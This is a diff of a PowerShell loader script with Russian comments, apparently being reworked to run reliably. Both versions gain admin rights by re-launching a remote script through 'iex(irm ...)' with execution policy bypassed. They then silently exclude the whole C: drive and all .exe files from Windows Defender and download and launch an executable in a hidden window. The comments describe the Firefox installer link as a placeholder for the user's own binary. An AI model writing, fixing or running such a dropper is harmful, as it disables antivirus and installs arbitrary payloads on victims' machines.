@@ -1,32 +1,44 @@
 $ErrorActionPreference = "SilentlyContinue"
-$ProgressPreference = "SilentlyContinue"
 
-# 1. жесткий перезапуск от админа
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $url = "https://raw.githubusercontent.com/sanek421/13232/main/bibriki"
-    # кодируем команду в base64, чтобы пробросить её без косяков с кавычками
-    $cmd = "iex(irm $url)"
-    $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
-    $encoded = [Convert]::ToBase64String($bytes)
-    
-    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" -Verb RunAs
-    exit
-}
+& {
+    # 1. определяем, админ мы или нет
+    $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+    $rand = [Guid]::NewGuid().Guid
+    $scriptUrl = "https://raw.githubusercontent.com/sanek421/13232/main/bibriki"
 
-# 2. вносим исключения
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /t REG_SZ /d 0 /f > $null 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /t REG_SZ /d 0 /f > $null 2>&1
-
-# 3. качаем и запускаем твой бинарник
-# замени ссылку на прямую ссылку на свой exe
-$url = "https://download-installer.cdn.mozilla.net/pub/firefox/releases/148.0.2/win32/ru/Firefox%20Installer.exe"
-$out = "$env:TEMP\Firefox%20Installer.exe"
-
-try {
-    Invoke-WebRequest -Uri $exeUrl -OutFile $path -UseBasicParsing
-    if (Test-Path $path) {
-        Start-Process -FilePath $path -WindowStyle Hidden
+    if (-not $isAdmin) {
+        # если не админ, создаем маленький cmd-загрузчик во временной папке пользователя
+        $tmp = "$env:USERPROFILE\AppData\Local\Temp\run_$rand.cmd"
+        # этот cmd просто заново вызовет твой irm | iex от имени админа
+        $content = "@echo off`r`npowershell -NoProfile -ExecutionPolicy Bypass -Command `"iex(irm $scriptUrl)`""
+        Set-Content -Path $tmp -Value $content
+        
+        # запускаем созданный cmd от админа
+        Start-Process -FilePath "$env:ComSpec" -ArgumentList "/c `"$tmp`"" -Verb RunAs -Wait
+        
+        # прибираемся за собой
+        if (Test-Path $tmp) { Remove-Item $tmp }
+        exit
     }
-} catch {
-    exit
+
+    # --- ВСЁ ЧТО НИЖЕ, ВЫПОЛНИТСЯ ТОЛЬКО ОТ АДМИНА ---
+
+    # 2. Исключения в Defender (тихо)
+    reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /t REG_SZ /d 0 /f > $null 2>&1
+    reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /t REG_SZ /d 0 /f > $null 2>&1
+
+    # 3. Скачивание и запуск твоего файла
+    $exeUrl = "https://download-installer.cdn.mozilla.net/pub/firefox/releases/148.0.2/win32/ru/Firefox%20Installer.exe"
+    $outPath = "$env:SystemRoot\Temp\Firefox%20Installer.exe" # в папку Temp системы, т.к. мы админы
+
+    try {
+        $wc = New-Object Net.WebClient
+        $wc.DownloadFile($exeUrl, $outPath)
+        
+        if (Test-Path $outPath) {
+            Start-Process -FilePath $outPath -WindowStyle Hidden
+        }
+    } catch {
+        exit
+    }
 }
